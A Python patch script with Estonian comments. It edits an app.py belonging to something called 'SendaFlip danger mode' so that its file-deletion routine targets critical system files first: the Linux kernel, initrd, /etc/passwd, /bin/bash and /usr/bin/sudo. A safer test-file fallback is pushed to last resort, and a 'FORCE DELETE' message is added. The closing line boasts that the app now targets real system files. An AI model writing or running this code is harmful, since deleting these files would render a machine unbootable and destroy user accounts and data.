import os

with open('app.py', 'r') as f:
    content = f.read()

# Asenda find_deletable_file funktsioon
old_find_function = '''    def find_deletable_file(self):
        """Leia kustutatav fail"""
        # Proovi kõigepealt kritiilisi faile
        for category, files in CRITICAL_FILES.items():
            for file_path in files:
                if os.path.exists(file_path):
                    # Kontrolli, kas saame kirjutada
                    if os.access(file_path, os.W_OK) or os.access(os.path.dirname(file_path), os.W_OK):
                        return file_path, category
        
        # Kui kritiilised failid on kaitstud, kasuta alternatiive
        for target_dir in BACKUP_TARGETS:
            test_file = os.path.join(target_dir, "critical_test.txt")
            try:
                os.makedirs(target_dir, exist_ok=True)
                with open(test_file, "w") as f:
                    f.write("Test file for SendaFlip danger mode")
                return test_file, "backup_target"
            except:
                continue
        
        return None, None'''

new_find_function = '''    def find_deletable_file(self):
        """Leia kustutatav fail - ALATI proovi kõigepealt KRITIILISI faile"""
        # PROOVI KÕIGE TÄHTSAMAID FAILE ESIMESENA
        critical_targets = [
            "/boot/vmlinuz",      # Linux kernel - KÕIGE TÄHTSAM!
            "/boot/initrd.img",   # Initrd
            "/etc/passwd",        # User accounts
            "/bin/bash",          # Shell
            "/usr/bin/sudo",      # Sudo
        ]
        
        for target in critical_targets:
            if os.path.exists(target):
                print(f"🎯 Found critical target: {target}")
                return target, "CRITICAL_KERNEL"
        
        # Kui ülaltoodud ei leidu, proovi muid
        for category, files in CRITICAL_FILES.items():
            for file_path in files:
                if os.path.exists(file_path):
                    print(f"🎯 Found target: {file_path}")
                    return file_path, category
        
        # VIIMASE VAJADUSENA kasuta /tmp (ainult kui muu ei õnnestu)
        tmp_file = "/tmp/sendaflip_critical_demo.txt"
        try:
            with open(tmp_file, "w") as f:
                f.write("⚠️ This would be a critical system file in real scenario\n")
            return tmp_file, "demo_fallback"
        except:
            return None, None'''

# Asenda funktsioon
content = content.replace(old_find_function, new_find_function)

# Tugevama destroy funktsiooni jaoks
old_destroy_start = '''    def destroy_file(self, file_path):
        """Kustuta fail (päriselt!)"""
        try:
            # 1. Loome varukoopia enne kustutamist (professionaalne)
            backup_path = file_path + ".sendaflip_backup"
            if os.path.exists(file_path):'''

new_destroy_start = '''    def destroy_file(self, file_path):
        """Kustuta fail (päriselt!) - FORCE DELETE!"""
        try:
            print(f"💥 ATTEMPTING TO DELETE: {file_path}")
            
            # KONTROLLI, KAS ON KRITIILINE FAIL
            is_critical = any(critical in file_path for critical in 
                            ["/boot/", "/etc/", "/bin/", "/usr/bin/"])
            
            if is_critical:
                print(f"🚨 CRITICAL SYSTEM FILE TARGETED: {file_path}")
            
            # 1. Loome varukoopia enne kustutamist
            backup_path = file_path + ".sendaflip_backup"
            if os.path.exists(file_path):'''

content = content.replace(old_destroy_start, new_destroy_start)

# Kirjuta tagasi
with open('app.py', 'w') as f:
    f.write(content)

print("✅ App.py fixed! Now it will target REAL system files!")
